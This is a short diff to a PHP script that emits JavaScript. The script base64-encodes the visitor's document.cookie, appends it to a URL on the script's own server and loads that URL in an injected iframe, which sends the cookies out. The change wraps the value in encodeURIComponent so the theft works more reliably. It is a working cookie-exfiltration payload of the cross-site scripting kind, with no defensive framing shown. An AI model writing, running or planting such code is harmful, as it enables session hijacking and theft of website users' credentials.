@@ -5,7 +5,7 @@
   echo "// $url\n";
   if( !isset( $_GET["c"] ) ){
 ?>
-var url = "<?php echo $url; ?>?c=" + btoa(document.cookie);
+var url = "<?php echo $url; ?>?c=" + encodeURIComponent(btoa(document.cookie));
 f = document.createElement('iframe');
 f.src = url;
 document.getElementsByTagName('body')[0].appendChild(f);
